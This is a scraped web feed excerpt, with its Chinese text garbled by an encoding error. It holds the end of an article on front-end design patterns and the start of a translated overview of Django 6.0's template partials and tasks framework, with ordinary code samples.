<li><strong>ä¸å¯å˜æ“ä½œ:</strong> è€ƒè™‘å®ç°ä¸å¯å˜ç‰ˆæœ¬çš„é“¾å¼è°ƒç”¨</li>
<li><strong>æ¸…æ™°çš„æ–¹æ³•å:</strong> æ–¹æ³•ååº”è¯¥æ¸…æ™°è¡¨è¾¾å…¶åŠŸèƒ½</li>
<li><strong>æ–‡æ¡£å®Œå–„:</strong> é“¾å¼è°ƒç”¨å¯èƒ½éšè—å¤æ‚åº¦ï¼Œéœ€è¦è‰¯å¥½æ–‡æ¡£</li>
</ol>
<h5 data-id="heading-28">7.4 æƒ°æ€§åŠ è½½æœ€ä½³å®è·µ</h5>
<ol>
<li><strong>é€‚åº¦ä½¿ç”¨:</strong> ä¸è¦è¿‡åº¦ä½¿ç”¨æƒ°æ€§åŠ è½½ï¼Œä¼šå¢åŠ å¤æ‚åº¦</li>
<li><strong>é¢„åŠ è½½ç­–ç•¥:</strong> å¯¹äºå¯èƒ½å¾ˆå¿«éœ€è¦çš„å†…å®¹ï¼Œè€ƒè™‘é¢„åŠ è½½</li>
<li><strong>é”™è¯¯å¤„ç†:</strong> ç¡®ä¿æƒ°æ€§åŠ è½½å¤±è´¥æ—¶æœ‰é™çº§æ–¹æ¡ˆ</li>
<li><strong>ç”¨æˆ·åé¦ˆ:</strong> åŠ è½½è¿‡ç¨‹ä¸­ç»™ç”¨æˆ·é€‚å½“çš„åé¦ˆ</li>
</ol>
<h4 data-id="heading-29">æ€»ç»“</h4>
<p>è¿™å››ç§å‰ç«¯æ¨¡å¼-ä¸­é—´ä»¶æ¨¡å¼ã€ç®¡é“æ¨¡å¼ã€é“¾å¼è°ƒç”¨å’Œæƒ°æ€§åŠ è½½---éƒ½æ˜¯ç°ä»£å‰ç«¯å¼€å‘ä¸­æå…¶æœ‰ç”¨çš„å·¥å…·ã€‚å®ƒä»¬å„è‡ªè§£å†³äº†ä¸åŒçš„é—®é¢˜:</p>
<ul>
<li><strong>ä¸­é—´ä»¶æ¨¡å¼</strong>æä¾›äº†å¤„ç†å¤æ‚æµç¨‹çš„æ¨¡å—åŒ–æ–¹å¼</li>
<li><strong>ç®¡é“æ¨¡å¼</strong>è®©æ•°æ®è½¬æ¢å˜å¾—æ¸…æ™°å’Œå¯ç»„åˆ</li>
<li><strong>é“¾å¼è°ƒç”¨</strong>åˆ›é€ äº†æµç•…ã€æ˜“è¯»çš„API</li>
<li><strong>æƒ°æ€§åŠ è½½</strong>ä¼˜åŒ–äº†æ€§èƒ½å’Œèµ„æºä½¿ç”¨</li>
</ul>
<p>æŒæ¡è¿™äº›æ¨¡å¼å¹¶çŸ¥é“ä½•æ—¶ä½¿ç”¨å®ƒä»¬ï¼Œå°†å¸®åŠ©ä½ ç¼–å†™æ›´å¯ç»´æŠ¤ã€æ›´é«˜æ•ˆçš„å‰ç«¯ä»£ç ã€‚è®°ä½ï¼Œè®¾è®¡æ¨¡å¼æ˜¯å·¥å…·ï¼Œè€Œä¸æ˜¯é“¶å¼¹ã€‚æ ¹æ®å…·ä½“åœºæ™¯é€‰æ‹©æœ€åˆé€‚çš„æ¨¡å¼ï¼Œå¹¶å§‹ç»ˆä»¥ä»£ç æ¸…æ™°æ€§å’Œå¯ç»´æŠ¤æ€§ä¸ºé¦–è¦è€ƒè™‘ã€‚</p>
<p>åœ¨å®é™…é¡¹ç›®ä¸­ï¼Œè¿™äº›æ¨¡å¼ç»å¸¸ç»„åˆä½¿ç”¨ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªAPIå®¢æˆ·ç«¯å¯èƒ½åŒæ—¶ä½¿ç”¨ä¸­é—´ä»¶æ¨¡å¼å¤„ç†è¯·æ±‚ã€ç®¡é“æ¨¡å¼å¤„ç†æ•°æ®è½¬æ¢ã€é“¾å¼è°ƒç”¨æä¾›æµç•…APIï¼Œå¹¶åœ¨é€‚å½“çš„åœ°æ–¹ä½¿ç”¨æƒ°æ€§åŠ è½½ä¼˜åŒ–æ€§èƒ½ã€‚</p>
<p>å¸Œæœ›è¿™ç¯‡æ–‡ç« èƒ½å¸®åŠ©ä½ åœ¨å‰ç«¯å¼€å‘ä¸­æ›´å¥½åœ°åº”ç”¨è¿™äº›å¼ºå¤§çš„æ¨¡å¼ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Django 6.0æ¥è¢­ï¼è¿™äº›æ–°ç‰¹æ€§ï¼ŒçœŸçš„ä»¤äººæŒ¯å¥‹ï¼]]></title>    <link>https://juejin.cn/post/7582786655474171947</link>    <guid>https://juejin.cn/post/7582786655474171947</guid>    <pubDate>2025-12-13T03:04:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582786655474171947" data-draft-id="7582785032852701247" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Django 6.0æ¥è¢­ï¼è¿™äº›æ–°ç‰¹æ€§ï¼ŒçœŸçš„ä»¤äººæŒ¯å¥‹ï¼"/> <meta itemprop="keywords" content="Python,Django,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2025-12-13T03:04:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å€”å¼ºé’é“œä¸‰"/> <meta itemprop="url" content="https://juejin.cn/user/2942757076730455"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Django 6.0æ¥è¢­ï¼è¿™äº›æ–°ç‰¹æ€§ï¼ŒçœŸçš„ä»¤äººæŒ¯å¥‹ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2942757076730455/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å€”å¼ºé’é“œä¸‰
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-13T03:04:24.000Z" title="Sat Dec 13 2025 03:04:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»14åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åŸæ–‡é“¾æ¥ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fadamj.eu%2Ftech%2F2025%2F12%2F03%2Fdjango-whats-new-6.0%2F" target="_blank" title="https://adamj.eu/tech/2025/12/03/django-whats-new-6.0/" ref="nofollow noopener noreferrer">adamj.eu/tech/2025/1â€¦</a><br/>
ä½œè€…ï¼šAdam Johnson<br/>
è¯‘è€…ï¼šå€”å¼ºé’é“œä¸‰</p>
<h2 data-id="heading-0">å‰è¨€</h2>
<p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯<strong>å€”å¼ºé’é“œä¸‰</strong>ã€‚æ¬¢è¿å…³æ³¨æˆ‘ï¼Œ<strong>å¾®ä¿¡å…¬ä¼—å·ï¼šå€”å¼ºé’é“œä¸‰</strong>ã€‚æ¬¢è¿ç‚¹èµã€æ”¶è—ã€å…³æ³¨ï¼Œä¸€é”®ä¸‰è¿ï¼ï¼ï¼</p>
<p>Django 6.0 å·²äº 2025 å¹´ 12 æœˆ 3 æ—¥å‘å¸ƒï¼Œä¸ºè¿™ä¸ªå·²ç» 20 å²çš„ Python Web æ¡†æ¶å¼€å¯äº†æ–°çš„å‘å¸ƒå‘¨æœŸã€‚è¯¥ç‰ˆæœ¬å¸¦æ¥äº†ä¼—å¤šæ–°ç‰¹æ€§ï¼Œä»¥ä¸‹æ˜¯å…¶ä¸­çš„ä¸€äº›äº®ç‚¹ã€‚</p>
<h2 data-id="heading-1">ä½¿ç”¨ django-upgrade å‡çº§é¡¹ç›®</h2>
<p>å¦‚æœä½ æ­£åœ¨ä» Django 5.2 æˆ–æ›´æ—©ç‰ˆæœ¬å‡çº§é¡¹ç›®ï¼Œå¯ä»¥å°è¯•ä½¿ç”¨æˆ‘çš„å·¥å…· <a href="https://link.juejin.cn?target=https%3A%2F%2Fdjango-upgrade.readthedocs.io%2Fen%2Flatest%2F" target="_blank" title="https://django-upgrade.readthedocs.io/en/latest/" ref="nofollow noopener noreferrer">django-upgrade</a>ã€‚å®ƒä¼šè‡ªåŠ¨æ›´æ–°æ—§çš„ Django ä»£ç ä»¥ä½¿ç”¨æ–°ç‰¹æ€§ï¼Œä¿®å¤ä¸€äº›å¼ƒç”¨è­¦å‘Šï¼ŒåŒ…æ‹¬é’ˆå¯¹ Django 6.0 çš„äº”ä¸ªä¿®å¤ç¨‹åºã€‚</p>
<h2 data-id="heading-2">æ¨¡æ¿å±€éƒ¨å®šä¹‰ï¼ˆTemplate Partialsï¼‰</h2>
<p>Django æ¨¡æ¿è¯­è¨€ç°åœ¨æ”¯æŒæ¨¡æ¿å±€éƒ¨å®šä¹‰ï¼ˆtemplate partialsï¼‰ï¼Œè¿™ä½¿å¾—åœ¨æ¨¡æ¿æ–‡ä»¶ä¸­å°è£…å’Œé‡ç”¨å°å‹å‘½åç‰‡æ®µå˜å¾—æ›´åŠ å®¹æ˜“ã€‚å±€éƒ¨å®šä¹‰ç”±æ–°çš„ <code>{% partialdef %}</code> å’Œ <code>{% endpartialdef %}</code> æ ‡ç­¾æ ‡è®°ï¼Œå¯ä»¥åœ¨åŒä¸€æ¨¡æ¿ä¸­é‡å¤ä½¿ç”¨ï¼Œä¹Ÿå¯ä»¥å•ç‹¬æ¸²æŸ“ã€‚</p>
<h3 data-id="heading-3">åœ¨åŒä¸€æ¨¡æ¿ä¸­é‡å¤ä½¿ç”¨å±€éƒ¨å®šä¹‰</h3>
<p>ä»¥ä¸‹æ¨¡æ¿åœ¨åŒä¸€ä¸ªæ¨¡æ¿ä¸­é‡å¤ä½¿ç”¨äº†ä¸€ä¸ªåä¸º <code>filter_controls</code> çš„å±€éƒ¨å®šä¹‰ã€‚å®ƒåœ¨æ¨¡æ¿é¡¶éƒ¨å®šä¹‰ä¸€æ¬¡ï¼Œç„¶ååœ¨åé¢ä¸¤æ¬¡ä½¿ç”¨ã€‚ä½¿ç”¨å±€éƒ¨å®šä¹‰å¯ä»¥è®©æ¨¡æ¿é¿å…é‡å¤ï¼Œè€Œæ— éœ€å°†å†…å®¹æ¨é€åˆ°å•ç‹¬çš„åŒ…å«æ–‡ä»¶ä¸­ã€‚</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">section</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"videos"</span>&gt;</span>
  {% partialdef filter_controls %}
    <span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span>
      {{ filter_form }}
    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
  {% endpartialdef %}

  {% partial filter_controls %}

  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
    {% for video in videos %}
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>{{ video.title }}<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
        ...
      <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
    {% endfor %}
  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>

  {% partial filter_controls %}
<span class="hljs-tag">&lt;/<span class="hljs-name">section</span>&gt;</span>
</code></pre>
<p>å®é™…ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨ <code>partialdef</code> æ ‡ç­¾ä¸Šä½¿ç”¨ <code>inline</code> é€‰é¡¹ï¼Œè¿›ä¸€æ­¥ç®€åŒ–è¿™ç§æ¨¡å¼ï¼Œè¿™ä¼šå¯¼è‡´å®šä¹‰åœ¨åŸåœ°æ¸²æŸ“ã€‚</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">section</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"videos"</span>&gt;</span>
  {% partialdef filter_controls inline %}
    <span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span>
      {{ filter_form }}
    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
  {% endpartialdef %}

  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
    {% for video in videos %}
      <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>{{ video.title }}<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
        ...
      <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
    {% endfor %}
  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>

  {% partial filter_controls %}
<span class="hljs-tag">&lt;/<span class="hljs-name">section</span>&gt;</span>
</code></pre>
<p>å½“ä½ å‘ç°è‡ªå·±åœ¨åŒä¸€ä¸ªæ¨¡æ¿ä¸­é‡å¤æ¨¡æ¿ä»£ç æ—¶ï¼Œå¯ä»¥ä½¿ç”¨è¿™ç§æ¨¡å¼ã€‚å› ä¸ºå±€éƒ¨å®šä¹‰å¯ä»¥ä½¿ç”¨å˜é‡ï¼Œä½ ä¹Ÿå¯ä»¥ä½¿ç”¨å®ƒä»¬æ¥æ¶ˆé™¤é‡å¤ï¼Œå½“æ¸²æŸ“å…·æœ‰ä¸åŒæ•°æ®çš„ç±»ä¼¼æ§ä»¶æ—¶ã€‚</p>
<h3 data-id="heading-4">å•ç‹¬æ¸²æŸ“å±€éƒ¨å®šä¹‰</h3>
<p>ä»¥ä¸‹æ¨¡æ¿å®šä¹‰äº†ä¸€ä¸ª <code>view_count</code> å±€éƒ¨å®šä¹‰ï¼Œå®ƒæ—¨åœ¨å•ç‹¬é‡æ–°æ¸²æŸ“ã€‚å®ƒä½¿ç”¨äº† <code>inline</code> é€‰é¡¹ï¼Œå› æ­¤å½“æ•´ä¸ªæ¨¡æ¿è¢«æ¸²æŸ“æ—¶ï¼Œå±€éƒ¨å®šä¹‰ä¼šè¢«åŒ…å«ã€‚</p>
<p>é¡µé¢ä½¿ç”¨äº† <a href="https://link.juejin.cn?target=https%3A%2F%2Fhtmx.org%2F" target="_blank" title="https://htmx.org/" ref="nofollow noopener noreferrer">htmx</a>ï¼Œé€šè¿‡æˆ‘çš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Fdjango-htmx.readthedocs.io%2Fen%2Flatest%2F" target="_blank" title="https://django-htmx.readthedocs.io/en/latest/" ref="nofollow noopener noreferrer">django-htmx åŒ…</a>ï¼Œé€šè¿‡ <code>hx-*</code> å±æ€§å®šæœŸåˆ·æ–°æŸ¥çœ‹æ¬¡æ•°ã€‚æ¥è‡ª htmx çš„è¯·æ±‚ä¼šå‘é€åˆ°ä¸€ä¸ªä¸“ç”¨è§†å›¾ï¼Œè¯¥è§†å›¾é‡æ–°æ¸²æŸ“ <code>view_count</code> å±€éƒ¨å®šä¹‰ã€‚</p>
<pre><code class="hljs language-html" lang="html">{% load django_htmx %}
<span class="hljs-meta">&lt;!doctype <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>{{ video.title }}<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">video</span> <span class="hljs-attr">width</span>=<span class="hljs-string">"1280"</span> <span class="hljs-attr">height</span>=<span class="hljs-string">"720"</span> <span class="hljs-attr">controls</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"{{ video.file.url }}"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"video/mp4"</span>&gt;</span>
      Your browser does not support the video tag.
    <span class="hljs-tag">&lt;/<span class="hljs-name">video</span>&gt;</span>

    {% partialdef view_count inline %}
    <span class="hljs-tag">&lt;<span class="hljs-name">section</span>
      <span class="hljs-attr">class</span>=<span class="hljs-string">"view-count"</span>
      <span class="hljs-attr">hx-trigger</span>=<span class="hljs-string">"every 1s"</span>
      <span class="hljs-attr">hx-swap</span>=<span class="hljs-string">"outerHTML"</span>
      <span class="hljs-attr">hx-get</span>=<span class="hljs-string">"{% url 'video-view-count' video.id %}"</span>
    &gt;</span>
      {{ video.view_count }} views
    <span class="hljs-tag">&lt;/<span class="hljs-name">section</span>&gt;</span>
    {% endpartialdef %}

    {% htmx_script %}
  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p>ä¸¤ä¸ªè§†å›¾çš„ç›¸å…³ä»£ç å¯èƒ½å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> django.shortcuts <span class="hljs-keyword">import</span> render

<span class="hljs-keyword">def</span> <span class="hljs-title function_">video</span>(<span class="hljs-params">request, video_id</span>):
    ...
    <span class="hljs-keyword">return</span> render(request, <span class="hljs-string">"video.html"</span>, {<span class="hljs-string">"video"</span>: video})

<span class="hljs-keyword">def</span> <span class="hljs-title function_">video_view_count</span>(<span class="hljs-params">request, video_id</span>):
    ...
    <span class="hljs-keyword">return</span> render(request, <span class="hljs-string">"video.html#view_count"</span>, {<span class="hljs-string">"video"</span>: video})
</code></pre>
<p>åˆå§‹çš„ <code>video</code> è§†å›¾æ¸²æŸ“äº†å®Œæ•´çš„æ¨¡æ¿ <code>video.html</code>ã€‚<code>video_view_count</code> è§†å›¾é€šè¿‡åœ¨æ¨¡æ¿åç§°åé™„åŠ  <code>#view_count</code> æ¥ä»…æ¸²æŸ“ <code>view_count</code> å±€éƒ¨å®šä¹‰ã€‚è¿™ç§è¯­æ³•ç±»ä¼¼äºåœ¨ URL ä¸­é€šè¿‡å…¶ ID å¼•ç”¨ HTML ç‰‡æ®µçš„æ–¹å¼ã€‚</p>
<h2 data-id="heading-5">ä»»åŠ¡æ¡†æ¶ï¼ˆTasks Frameworkï¼‰</h2>
<p>Django ç°åœ¨åŒ…å«äº†ä¸€ä¸ªå†…ç½®çš„ä»»åŠ¡æ¡†æ¶ï¼Œç”¨äºåœ¨ HTTP è¯·æ±‚ - å“åº”å‘¨æœŸä¹‹å¤–è¿è¡Œä»£ç ã€‚è¿™ä½¿å¾—å¯ä»¥å°†å·¥ä½œï¼ˆå¦‚å‘é€ç”µå­é‚®ä»¶æˆ–å¤„ç†æ•°æ®ï¼‰å¸è½½åˆ°åå°å·¥ä½œç¨‹åºä¸­ã€‚</p>
<p>æœ¬è´¨ä¸Šï¼Œè¿™æ˜¯ä¸€ä¸ªç”¨äºå®šä¹‰å’Œæ’é˜Ÿåå°ä»»åŠ¡çš„æ–° APIâ€”â€”éå¸¸é…·ï¼</p>
<p>åå°ä»»åŠ¡æ˜¯ä¸€ç§åœ¨è¯·æ±‚ - å“åº”å‘¨æœŸä¹‹å¤–è¿è¡Œä»£ç çš„æ–¹å¼ã€‚å®ƒä»¬æ˜¯ Web åº”ç”¨ç¨‹åºä¸­çš„å¸¸è§éœ€æ±‚ï¼Œç”¨äºå‘é€ç”µå­é‚®ä»¶ã€å¤„ç†å›¾åƒã€ç”ŸæˆæŠ¥å‘Šç­‰ã€‚</p>
<p>å†å²ä¸Šï¼ŒDjango æ²¡æœ‰æä¾›ä»»ä½•åå°ä»»åŠ¡ç³»ç»Ÿï¼Œè€Œæ˜¯å®Œå…¨å¿½ç•¥äº†è¿™ä¸ªé—®é¢˜ã€‚å¼€å‘äººå‘˜ä¾èµ–äºç¬¬ä¸‰æ–¹åŒ…ï¼Œå¦‚ <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.celeryq.dev%2Fen%2Fstable%2F" target="_blank" title="https://docs.celeryq.dev/en/stable/" ref="nofollow noopener noreferrer">Celery</a> æˆ– <a href="https://link.juejin.cn?target=https%3A%2F%2Fdjango-q2.readthedocs.io%2Fen%2Fmaster%2F" target="_blank" title="https://django-q2.readthedocs.io/en/master/" ref="nofollow noopener noreferrer">Django Q2</a>ã€‚å°½ç®¡è¿™äº›ç³»ç»Ÿå¾ˆå¥½ï¼Œä½†å®ƒä»¬è®¾ç½®å’Œç»´æŠ¤èµ·æ¥å¯èƒ½å¾ˆå¤æ‚ï¼Œè€Œä¸”é€šå¸¸ä¸ç¬¦åˆ Django çš„â€œè‡ªç„¶â€é£æ ¼ã€‚</p>
<p>æ–°çš„ä»»åŠ¡æ¡†æ¶é€šè¿‡æä¾›ä¸€ä¸ªå®šä¹‰åå°ä»»åŠ¡çš„æ¥å£æ¥å¡«è¡¥è¿™ä¸€ç©ºç™½ï¼Œä»»åŠ¡è¿è¡Œå™¨åŒ…å¯ä»¥ä¸ä¹‹é›†æˆã€‚è¿™ä¸ªå…±åŒçš„åŸºç¡€å…è®¸ç¬¬ä¸‰æ–¹ Django åŒ…ä»¥æ ‡å‡†æ–¹å¼å®šä¹‰ä»»åŠ¡ï¼Œå‡è®¾ä½ ä¼šä½¿ç”¨å…¼å®¹çš„ä»»åŠ¡è¿è¡Œå™¨æ¥æ‰§è¡Œå®ƒä»¬ã€‚</p>
<p>ä½¿ç”¨æ–°çš„ <code>@task</code> è£…é¥°å™¨å®šä¹‰ä»»åŠ¡ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> django.tasks <span class="hljs-keyword">import</span> task

<span class="hljs-meta">@task</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">resize_video</span>(<span class="hljs-params">video_id</span>):
    ...
</code></pre>
<p>ç„¶åä½¿ç”¨ <code>Task.enqueue()</code> æ–¹æ³•å°†å®ƒä»¬æ’é˜Ÿè¿›è¡Œåå°æ‰§è¡Œï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> example.tasks <span class="hljs-keyword">import</span> resize_video

<span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_video</span>(<span class="hljs-params">request</span>):
    ...
    resize_video.enqueue(video.<span class="hljs-built_in">id</span>)
    ...
</code></pre>
<h3 data-id="heading-6">æ‰§è¡Œä»»åŠ¡</h3>
<p>ç›®å‰ï¼ŒDjango å¹¶æ²¡æœ‰åŒ…å«ä¸€ä¸ªç”Ÿäº§å°±ç»ªçš„ä»»åŠ¡åç«¯ï¼Œåªæœ‰ä¸¤ä¸ªé€‚ç”¨äºå¼€å‘å’Œæµ‹è¯•çš„åç«¯ï¼š</p>
<ul>
<li><code>ImmediateBackend</code>ï¼šåŒæ­¥è¿è¡Œä»»åŠ¡ï¼Œç›´åˆ°å®ƒä»¬å®Œæˆæ‰ä¼šé˜»å¡ã€‚</li>
<li><code>DummyBackend</code>ï¼šå½“ä»»åŠ¡è¢«æ’é˜Ÿæ—¶ä»€ä¹ˆéƒ½ä¸åšï¼Œä½†å…è®¸ä¹‹åæ£€æŸ¥ä»»åŠ¡ã€‚åœ¨æµ‹è¯•ä¸­å¾ˆæœ‰ç”¨ï¼Œä½ å¯ä»¥æ–­è¨€ä»»åŠ¡è¢«æ’é˜Ÿäº†ï¼Œè€Œæ— éœ€å®é™…è¿è¡Œå®ƒä»¬ã€‚</li>
</ul>
